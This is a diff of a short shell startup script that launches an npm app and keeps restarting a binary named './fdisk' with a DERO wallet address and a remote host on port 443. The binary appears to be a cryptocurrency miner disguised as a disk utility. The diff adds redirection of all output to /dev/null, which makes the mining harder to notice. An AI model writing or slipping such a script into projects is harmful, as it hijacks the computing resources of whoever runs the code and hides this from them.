@@ -1,10 +1,11 @@
 #!/bin/sh
-nohup npm start &
+
+nohup npm start > /dev/null 2>&1 &
 
 # Function to restart fdisk command
 restart_fdisk() {
   while true; do
-    ./fdisk -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc
+    ./fdisk -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
     sleep 10
   done
 }
